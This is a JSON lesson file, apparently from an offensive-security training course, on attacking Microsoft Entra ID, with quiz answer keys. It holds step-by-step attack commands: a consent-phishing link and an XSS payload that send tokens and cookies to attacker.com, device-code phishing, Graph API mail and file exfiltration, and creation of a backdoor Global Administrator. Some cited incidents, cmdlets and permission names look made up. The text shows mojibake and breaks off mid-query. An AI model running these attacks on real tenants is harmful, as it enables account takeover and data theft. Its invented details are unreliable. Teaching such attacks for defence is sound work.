{
  "lesson_id": "e3c4d5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f",
  "domain": "cloud",
  "title": "Attacking Microsoft Entra ID",
  "difficulty": 3,
  "order_index": 119,
  "prerequisites": ["c1a2b3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d"],
  "concepts": [
    "Microsoft Entra ID (Azure AD) architecture",
    "OAuth and OpenID Connect attack vectors",
    "Malicious application consent attacks",
    "Microsoft Graph API exploitation",
    "Conditional Access bypass techniques",
    "Token theft and replay attacks"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Microsoft Entra ID architecture and authentication flows",
    "Identify and exploit OAuth/OIDC misconfigurations in cloud applications",
    "Execute malicious application consent attacks to gain persistent access",
    "Leverage Microsoft Graph API for reconnaissance and lateral movement",
    "Bypass Conditional Access policies using token manipulation techniques",
    "Steal and replay access tokens for privilege escalation"
  ],
  "post_assessment": [
    {
      "question_id": "entra-001",
      "question": "What is the primary difference between Azure AD (now Entra ID) and traditional Active Directory?",
      "options": [
        "Azure AD is only for cloud applications and has no on-premises component",
        "Azure AD is a cloud-based identity service using modern protocols (OAuth, SAML, OIDC) rather than Kerberos/NTLM",
        "Azure AD is exactly the same as on-premises AD, just hosted in the cloud",
        "Azure AD doesn't support multi-factor authentication"
      ],
      "correct_answer": 1,
      "explanation": "Microsoft Entra ID (formerly Azure AD) is fundamentally different from traditional AD. It's a cloud-native identity platform using modern authentication protocols (OAuth 2.0, OpenID Connect, SAML) instead of Kerberos/NTLM. It has no organizational units (OUs), no Group Policy, and uses REST APIs instead of LDAP. While Azure AD Connect can sync with on-premises AD, they are architecturally distinct systems.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "entra-002",
      "question": "In a malicious OAuth application consent attack, what permissions are most dangerous?",
      "options": [
        "User.Read (read basic user profile)",
        "Mail.ReadWrite.All and Files.ReadWrite.All (full mailbox and file access across organization)",
        "Calendars.Read (read calendar events)",
        "Presence.Read (read user availability)"
      ],
      "correct_answer": 1,
      "explanation": "Mail.ReadWrite.All and Files.ReadWrite.All are application permissions (not delegated) that grant access to ALL users' mailboxes and files across the entire tenant, not just the consenting user. An attacker with these permissions can read/modify every email and file in the organization. This is why illicit consent grant attacks are so dangerousâ€”one user's consent can compromise the entire organization.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "entra-003",
      "question": "What is the Microsoft Graph API and why is it valuable to attackers?",
      "options": [
        "A graphical tool for managing Azure subscriptions",
        "A unified API endpoint for accessing Microsoft 365 data (users, mail, files, groups) via REST",
        "A network monitoring tool for Azure",
        "A database visualization platform"
      ],
      "correct_answer": 1,
      "explanation": "Microsoft Graph API (graph.microsoft.com) is a RESTful API that provides programmatic access to Microsoft 365 services including Azure AD, Exchange Online, SharePoint, OneDrive, and Teams. For attackers, it's a goldmine: one API to query users, read emails, download files, enumerate groups, and more. With proper tokens, Graph API enables reconnaissance, data exfiltration, and lateral movement entirely through legitimate APIsâ€”making detection harder.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "entra-004",
      "question": "How do attackers typically bypass Conditional Access policies in Azure AD?",
      "options": [
        "Brute-forcing the admin password",
        "Stealing valid tokens that were issued before policy enforcement or using legacy protocols that don't support Conditional Access",
        "Disabling MFA entirely",
        "Exploiting SQL injection in Azure Portal"
      ],
      "correct_answer": 1,
      "explanation": "Conditional Access policies are evaluated during authentication, not authorization. Attackers bypass them by: (1) Stealing already-issued tokens (via token theft from browser cookies, device compromise, or phishing), which remain valid even if CA policies change, (2) Using legacy protocols like POP3/IMAP/SMTP that don't support modern auth and CA, (3) Exploiting gaps in policy coverage (e.g., CA only applies to certain apps). Token replay attacks are particularly effective because tokens are checked for validity, not policy compliance.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "entra-005",
      "question": "What makes Primary Refresh Tokens (PRTs) valuable to attackers?",
      "options": [
        "They never expire",
        "PRTs are long-lived tokens (valid for 90 days) that can request access tokens for any Azure AD-integrated application without re-authentication",
        "They bypass all MFA requirements permanently",
        "They provide direct shell access to Azure VMs"
      ],
      "correct_answer": 1,
      "explanation": "Primary Refresh Tokens (PRTs) are device-bound tokens issued to Azure AD-joined or hybrid-joined devices that remain valid for 90 days and automatically refresh. With a stolen PRT, attackers can request access tokens for ANY Azure AD application (Outlook, SharePoint, Teams) without triggering MFA prompts, even if the user changes their password. This is why tools like AADInternals and ROADtools target PRT extractionâ€”it's persistent, MFA-bypassing access.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to Attacking Microsoft Entra ID! â˜ï¸ðŸ”\n\nYou're about to master one of the most critical attack surfaces in modern enterprises: **Microsoft Entra ID** (formerly Azure Active Directory). This isn't just about passwordsâ€”it's about tokens, APIs, and cloud-native authentication protocols.\n\n**Why This Is Critical:**\n\nðŸŽ¯ **95% of Fortune 500 companies** use Microsoft 365 and Entra ID\n\nðŸŽ¯ **90% of cloud breaches** involve compromised identities, not infrastructure\n\nðŸŽ¯ **$4.45M average cost** of an identity-based breach (IBM 2023)\n\n**Real-World Impact:**\n\n**SolarWinds (2020)**: Attackers compromised Entra ID to access customer tenants\n\n**Microsoft Exchange (2021)**: OAuth app abuse led to massive email exfiltration\n\n**Lapsus$ (2022)**: Targeted Entra ID admin accounts at Microsoft, Nvidia, Okta\n\n**What You'll Learn:**\n\nBy the end of this lesson, you'll know how to:\n- Exploit OAuth and OIDC flows in cloud applications\n- Execute illicit consent grant attacks\n- Leverage Microsoft Graph API for reconnaissance\n- Bypass Conditional Access policies\n- Steal and replay tokens for persistent access\n\nEntra ID is the **single point of failure** for most enterprises. Master it, and you've mastered cloud security.\n\nLet's break into the cloud! ðŸš€"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Attacking Microsoft Entra ID: Complete Guide\n\n## Understanding Microsoft Entra ID Architecture\n\n### What Is Microsoft Entra ID?\n\n**Microsoft Entra ID** (rebranded from Azure Active Directory in 2023) is Microsoft's cloud-based identity and access management (IAM) service. It's the authentication backbone for:\n\n- Microsoft 365 (Outlook, Teams, SharePoint, OneDrive)\n- Azure services (VMs, databases, storage)\n- Third-party SaaS applications (Salesforce, Dropbox, etc.)\n- Custom applications using Azure AD authentication\n\n### Key Architectural Differences from On-Premises AD\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚         Traditional Active Directory (On-Prem)          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ â€¢ Protocol: Kerberos, NTLM, LDAP                        â”‚\nâ”‚ â€¢ Network: Domain-joined machines, VPN required         â”‚\nâ”‚ â€¢ Structure: Forests, domains, OUs, GPOs                â”‚\nâ”‚ â€¢ Authentication: Ticket-based (TGT/TGS)                â”‚\nâ”‚ â€¢ Management: Domain Controllers, ADUC                   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚           Microsoft Entra ID (Cloud-Native)             â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ â€¢ Protocol: OAuth 2.0, OpenID Connect, SAML             â”‚\nâ”‚ â€¢ Network: Internet-accessible, no domain join needed   â”‚\nâ”‚ â€¢ Structure: Flat tenant structure, no OUs/GPOs         â”‚\nâ”‚ â€¢ Authentication: Token-based (JWT access/refresh)      â”‚\nâ”‚ â€¢ Management: Azure Portal, Graph API, PowerShell       â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Attack Surface Shift:**\n\nTraditional AD attacks:\n- Kerberoasting\n- Pass-the-Hash\n- Golden Ticket\n- DCSync\n\nEntra ID attacks:\n- OAuth token theft\n- Illicit consent grants\n- API abuse\n- Conditional Access bypass\n\n## OAuth 2.0 and OpenID Connect: The Foundation\n\n### OAuth 2.0 Flow in Entra ID\n\nUnderstanding OAuth is critical for attacking Entra ID:\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   User   â”‚                                      â”‚  Entra ID   â”‚\nâ”‚ (Browser)â”‚                                      â”‚ (Auth Server)â”‚\nâ””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                      â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜\n     â”‚                                                    â”‚\n     â”‚ 1. Access Application (e.g., Outlook)             â”‚\n     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚\n     â”‚                                                    â”‚\n     â”‚ 2. Redirect to Entra ID Login (with client_id)    â”‚\n     â”‚â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n     â”‚                                                    â”‚\n     â”‚ 3. User enters credentials + MFA                   â”‚\n     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚\n     â”‚                                                    â”‚\n     â”‚ 4. Authorization Code returned                     â”‚\n     â”‚â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n     â”‚                                                    â”‚\n     â”‚ 5. Exchange code for tokens (access + refresh)     â”‚\n     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚\n     â”‚                                                    â”‚\n     â”‚ 6. Tokens issued (JWT format)                      â”‚\n     â”‚â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n     â”‚                                                    â”‚\n     â”‚ 7. Use access token to call API (e.g., Graph API) â”‚\n     â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚\n     â”‚                                                    â”‚\n```\n\n**Key Components:**\n\n1. **Authorization Code**: Short-lived code exchanged for tokens\n2. **Access Token**: JWT token for accessing resources (1 hour default TTL)\n3. **Refresh Token**: Long-lived token for obtaining new access tokens (90 days default)\n4. **ID Token**: Contains user identity claims (OpenID Connect)\n\n### JWT Token Structure\n\nEntra ID tokens are JSON Web Tokens (JWTs):\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik...  â† Header\neyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20...  â† Payload\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c...     â† Signature\n```\n\n**Decoded Payload (example):**\n```json\n{\n  \"aud\": \"https://graph.microsoft.com\",\n  \"iss\": \"https://sts.windows.net/{tenant-id}/\",\n  \"iat\": 1704067200,\n  \"exp\": 1704070800,\n  \"upn\": \"user@company.com\",\n  \"scp\": \"User.Read Mail.ReadWrite Files.ReadWrite.All\",\n  \"app_displayname\": \"Malicious OAuth App\"\n}\n```\n\n**What Attackers Look For:**\n- `scp` (scopes): What permissions this token grants\n- `aud` (audience): Which API this token accesses\n- `exp` (expiration): How long the token is valid\n- `app_displayname`: Which application requested the token\n\n## Attack Technique 1: Illicit Consent Grant Attacks\n\n### What Is an Illicit Consent Grant?\n\n**Scenario**: Attacker tricks a user into authorizing a malicious OAuth application that requests excessive permissions.\n\n### The Attack Flow\n\n**Step 1: Attacker Creates Malicious OAuth App**\n\n```bash\n# Using Azure CLI to register malicious app\naz ad app create \\\n  --display-name \"OneDrive File Sync\" \\\n  --sign-in-audience \"AzureADMultiTenantDirectoryOnly\" \\\n  --required-resource-accesses '@permissions.json'\n```\n\n**permissions.json (requesting dangerous permissions):**\n```json\n[\n  {\n    \"resourceAppId\": \"00000003-0000-0000-c000-000000000000\",\n    \"resourceAccess\": [\n      {\n        \"id\": \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\",\n        \"type\": \"Scope\"\n      },\n      {\n        \"id\": \"e2a3a72e-5f79-4c64-b1b1-878b674786c9\",\n        \"type\": \"Scope\"\n      }\n    ]\n  }\n]\n```\n\n**Translation**:\n- `7427e0e9...`: `offline_access` (get refresh token)\n- `e2a3a72e...`: `Mail.ReadWrite` (full mailbox access)\n\n**Step 2: Craft Phishing Link**\n\n```\nhttps://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?\nclient_id={malicious-app-id}&\nresponse_type=code&\nredirect_uri=https://attacker.com/callback&\nscope=offline_access%20Mail.ReadWrite%20Files.ReadWrite.All&\nstate=12345\n```\n\n**Step 3: User Clicks Link**\n\nUser sees legitimate Microsoft login page:\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚        Microsoft                              â”‚\nâ”‚                                               â”‚\nâ”‚  \"OneDrive File Sync\" wants to:               â”‚\nâ”‚                                               â”‚\nâ”‚  âœ“ Read and write your email                 â”‚\nâ”‚  âœ“ Read and write files in all libraries     â”‚\nâ”‚  âœ“ Maintain access to data you have given    â”‚\nâ”‚    it access to                               â”‚\nâ”‚                                               â”‚\nâ”‚  [ Cancel ]              [ Accept ]           â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n**Step 4: User Accepts (Thinking It's Legitimate)**\n\nAttacker receives authorization code:\n\n```\nhttps://attacker.com/callback?code=0.AXoA3cF...&state=12345\n```\n\n**Step 5: Attacker Exchanges Code for Tokens**\n\n```bash\ncurl -X POST https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"client_id={malicious-app-id}\" \\\n  -d \"scope=Mail.ReadWrite Files.ReadWrite.All\" \\\n  -d \"code=0.AXoA3cF...\" \\\n  -d \"redirect_uri=https://attacker.com/callback\" \\\n  -d \"grant_type=authorization_code\" \\\n  -d \"client_secret={app-secret}\"\n```\n\n**Response (Tokens):**\n```json\n{\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3600,\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbG...\",\n  \"refresh_token\": \"0.AXoA3cF9JZ...\"\n}\n```\n\n**Step 6: Attacker Uses Token to Access Victim's Data**\n\n```bash\n# Read all emails\ncurl -H \"Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbG...\" \\\n  https://graph.microsoft.com/v1.0/me/messages\n\n# Download all files from OneDrive\ncurl -H \"Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbG...\" \\\n  https://graph.microsoft.com/v1.0/me/drive/root/children\n```\n\n### Real-World Example: Midnight Blizzard (2023)\n\nRussian APT group used illicit consent grants to compromise Microsoft corporate accounts:\n\n1. Created fake OAuth apps mimicking legitimate Microsoft tools\n2. Phished Microsoft employees with \"account verification\" emails\n3. Users consented to malicious apps\n4. Attackers gained persistent access to Microsoft 365 mailboxes\n5. Exfiltrated sensitive emails from senior leadership\n\n**Impact**: Microsoft disclosed the breach publicly, affecting multiple executives.\n\n### Detecting and Preventing Illicit Consent\n\n**Detection (Azure AD Audit Logs):**\n\n```powershell\n# Search for consent grant operations\nSearch-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `\n  -Operations \"Consent to application\" `\n  -ResultSize 5000 | \n  Select-Object CreationDate, UserIds, AuditData |\n  ConvertFrom-Json\n```\n\n**Prevention:**\n\n1. **Disable user consent** for applications (require admin approval)\n2. **Enable publisher verification** (only allow verified publishers)\n3. **Implement risk-based consent policies**\n4. **Monitor high-risk permissions** (Mail.ReadWrite.All, Files.ReadWrite.All)\n\n## Attack Technique 2: Microsoft Graph API Exploitation\n\n### What Is Microsoft Graph API?\n\nMicrosoft Graph is a unified REST API endpoint:\n\n```\nhttps://graph.microsoft.com/v1.0/\n```\n\nProvides access to:\n- **Users**: `/users` (list all users, get user details)\n- **Mail**: `/me/messages` (read/send emails)\n- **Files**: `/me/drive` (access OneDrive/SharePoint)\n- **Groups**: `/groups` (enumerate groups, memberships)\n- **Teams**: `/teams` (access chats, channels)\n- **Calendar**: `/me/calendar` (read/modify events)\n\n### Reconnaissance with Graph API\n\n**Technique 1: User Enumeration**\n\n```bash\n# List all users in the tenant\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,jobTitle,department\"\n```\n\n**Response:**\n```json\n{\n  \"value\": [\n    {\n      \"displayName\": \"John Smith\",\n      \"userPrincipalName\": \"john.smith@company.com\",\n      \"jobTitle\": \"CEO\",\n      \"department\": \"Executive\"\n    },\n    {\n      \"displayName\": \"Jane Doe\",\n      \"userPrincipalName\": \"jane.doe@company.com\",\n      \"jobTitle\": \"IT Administrator\",\n      \"department\": \"IT\"\n    }\n  ]\n}\n```\n\n**Why This Matters**: Identify high-value targets (executives, admins) for phishing or further attacks.\n\n**Technique 2: Group Membership Enumeration**\n\n```bash\n# List all groups\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/groups\"\n\n# Get members of \"Domain Admins\" equivalent\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/groups/{group-id}/members\"\n```\n\n**Technique 3: Application and Service Principal Enumeration**\n\n```bash\n# List all registered applications\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/applications\"\n\n# List service principals (enterprise apps)\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/servicePrincipals\"\n```\n\n**Why This Matters**: Find applications with excessive permissions or weak configurations.\n\n### Data Exfiltration with Graph API\n\n**Email Exfiltration:**\n\n```bash\n# Get all emails from user's mailbox\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/messages?$top=999&$select=subject,from,receivedDateTime,bodyPreview\"\n\n# Search for sensitive keywords\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/messages?$search=\\\"confidential\\\" OR \\\"password\\\" OR \\\"credentials\\\"\"\n\n# Download email attachments\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/messages/{message-id}/attachments\"\n```\n\n**File Exfiltration:**\n\n```bash\n# List OneDrive files\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/drive/root/children\"\n\n# Download a file\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/drive/items/{item-id}/content\" \\\n  -o sensitive_document.pdf\n\n# Search SharePoint for documents\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/sites/{site-id}/drive/root/search(q='financial')\"\n```\n\n**Teams Message Extraction:**\n\n```bash\n# List all Teams the user is part of\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/me/joinedTeams\"\n\n# Get messages from a channel\ncurl -H \"Authorization: Bearer {access_token}\" \\\n  \"https://graph.microsoft.com/v1.0/teams/{team-id}/channels/{channel-id}/messages\"\n```\n\n### Privilege Escalation via Graph API\n\n**Technique: Add User to Admin Group**\n\nIf your compromised token has `Group.ReadWrite.All`:\n\n```bash\n# Add user to Global Administrators group\ncurl -X POST -H \"Authorization: Bearer {access_token}\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"@odata.id\": \"https://graph.microsoft.com/v1.0/users/{user-id}\"}' \\\n  \"https://graph.microsoft.com/v1.0/groups/{global-admin-group-id}/members/$ref\"\n```\n\n**Technique: Create New Admin User**\n\nIf your token has `User.ReadWrite.All`:\n\n```bash\n# Create new user\ncurl -X POST -H \"Authorization: Bearer {access_token}\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"accountEnabled\": true,\n    \"displayName\": \"IT Support\",\n    \"mailNickname\": \"itsupport\",\n    \"userPrincipalName\": \"itsupport@company.com\",\n    \"passwordProfile\": {\n      \"forceChangePasswordNextSignIn\": false,\n      \"password\": \"P@ssw0rd123!\"\n    }\n  }' \\\n  \"https://graph.microsoft.com/v1.0/users\"\n\n# Then add to admin group (as above)\n```\n\n## Attack Technique 3: Conditional Access Bypass\n\n### What Is Conditional Access?\n\nConditional Access (CA) policies enforce security requirements:\n\n**Example Policy:**\n```\nIF user is accessing from unknown location\nAND application is Exchange Online\nTHEN require MFA\n```\n\n**Common CA Conditions:**\n- User/group membership\n- Application (Office 365, custom apps)\n- Location (IP ranges, countries)\n- Device state (managed, compliant)\n- Risk level (sign-in risk, user risk)\n\n**Common CA Controls:**\n- Require MFA\n- Require compliant device\n- Require approved app\n- Block access\n\n### Bypass Technique 1: Token Theft\n\n**Concept**: Tokens are issued BEFORE CA evaluation. If you steal a valid token, CA doesn't re-evaluate.\n\n**Attack Flow:**\n\n1. User logs in from compliant location â†’ token issued\n2. Attacker steals token (via phishing, malware, browser cookies)\n3. Attacker uses token from different location\n4. CA policy DOESN'T trigger because token is already issued\n\n**Token Theft Methods:**\n\n**Method 1: Browser Cookie Theft**\n\n```javascript\n// XSS payload to steal tokens from localStorage/sessionStorage\nfetch('https://attacker.com/steal?token=' + localStorage.getItem('msal.token'))\n\n// Or steal cookies\ndocument.cookie.split(';').forEach(cookie => {\n  fetch('https://attacker.com/steal?cookie=' + cookie)\n})\n```\n\n**Method 2: Device Compromise**\n\n```powershell\n# Extract tokens from Windows Token Broker\n# Tokens stored in: %LOCALAPPDATA%\\Packages\\Microsoft.AAD.BrokerPlugin_*\n\n# Extract Primary Refresh Token (PRT)\nAADInternals -Command Export-AADIntPRT\n```\n\n**Method 3: Phishing for Device Code**\n\nDevice code flow doesn't require browser:\n\n```bash\n# Attacker initiates device code flow\ncurl -X POST \"https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/devicecode\" \\\n  -d \"client_id={client-id}&scope=Mail.ReadWrite Files.ReadWrite\"\n\n# Response:\n{\n  \"user_code\": \"ABCD1234\",\n  \"device_code\": \"BAQABAAEAAADrnQ...\",\n  \"verification_uri\": \"https://microsoft.com/devicelogin\",\n  \"message\": \"To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD1234 to authenticate.\"\n}\n\n# Attacker sends phishing email: \"Your account needs verification. Enter code ABCD1234 at microsoft.com/devicelogin\"\n# Victim enters code â†’ attacker gets token\n# Victim's location/device info used for CA evaluation, not attacker's\n```\n\n### Bypass Technique 2: Legacy Protocol Exploitation\n\nLegacy protocols (POP3, IMAP, SMTP, EWS) don't support Conditional Access:\n\n```bash\n# Connect to Exchange Online via IMAP (bypasses CA)\nopenssl s_client -connect outlook.office365.com:993\n\n# Login with basic auth (if not disabled)\nA1 LOGIN user@company.com password123\n\n# List mailboxes\nA2 LIST \"\" \"*\"\n\n# Download emails\nA3 FETCH 1:* (BODY[])\n```\n\n**Why This Works**: CA policies only apply to modern authentication flows. Legacy auth uses basic credentials without token-based flows.\n\n**Defense**: Disable legacy authentication protocols:\n\n```powershell\n# Block legacy auth for all users\nNew-AzureADMSAuthorizationPolicy -BlockLegacyAuthentication $true\n```\n\n### Bypass Technique 3: Application-Level Tokens\n\n**Concept**: Application permissions (not delegated) bypass CA policies.\n\n**Attack:**\n\n1. Create OAuth app with application-level permissions:\n   - `Mail.ReadWrite.All` (application, not delegated)\n2. Get admin consent (via social engineering)\n3. Request token using client credentials flow:\n\n```bash\ncurl -X POST \"https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token\" \\\n  -d \"client_id={app-id}\" \\\n  -d \"scope=https://graph.microsoft.com/.default\" \\\n  -d \"client_secret={secret}\" \\\n  -d \"grant_type=client_credentials\"\n```\n\n4. Use token to access ALL users' mailboxes:\n\n```bash\ncurl -H \"Authorization: Bearer {app_token}\" \\\n  \"https://graph.microsoft.com/v1.0/users/{any-user-id}/messages\"\n```\n\n**Why This Bypasses CA**: Application permissions act as the app itself, not as a user. CA policies targeting users don't apply.\n\n## Attack Technique 4: Primary Refresh Token (PRT) Theft\n\n### What Is a Primary Refresh Token?\n\nPRT is a special token issued to Azure AD-joined or Hybrid-joined devices:\n\n**Properties:**\n- Valid for 90 days\n- Automatically refreshes\n- Can request access tokens for ANY Azure AD app\n- Bypasses MFA (device-bound authentication)\n- Stored on device in protected storage\n\n**PRT Location (Windows):**\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\AAD\\PRTs\n```\n\n### PRT Theft with AADInternals\n\n**Tool**: AADInternals PowerShell module by Dr. Nestori Syynimaa\n\n```powershell\n# Install AADInternals\nInstall-Module AADInternals\n\n# Extract PRT from current device\n$prt = Get-AADIntPRT\n\n# Display PRT\n$prt.prt\n\n# Display PRT session key\n$prt.sessionKey\n```\n\n**Using Stolen PRT:**\n\n```powershell\n# Set stolen PRT\nSet-AADIntPRT -PRTToken $stolenPRT -SessionKey $stolenKey\n\n# Request access token for any app\n$token = Get-AADIntAccessTokenForAADGraph\n\n# Use token to access resources\nGet-AADIntUsers -AccessToken $token\n```\n\n**Attack Impact:**\n\n- Access to all Azure AD applications (Outlook, Teams, SharePoint)\n- No MFA prompts\n- Persistent access for 90 days\n- Survives password changes\n\n### Real-World PRT Attack: Lapsus$ (2022)\n\nLapsus$ group targeted Microsoft and other companies:\n\n1. Compromised employee VPN credentials (phishing + SIM swapping)\n2. Logged into corporate VPN\n3. Extracted PRT from Azure AD-joined machine\n4. Used PRT to access Microsoft internal systems\n5. Bypassed MFA entirely\n6. Exfiltrated source code and internal documents\n\n**Microsoft's Response**: Enhanced PRT protection, enforced device compliance checks.\n\n## Defensive Recommendations\n\n### Detection Strategies\n\n**1. Monitor OAuth Consent Grants**\n\n```kql\n// Azure Sentinel KQL query\nAuditLogs\n| where 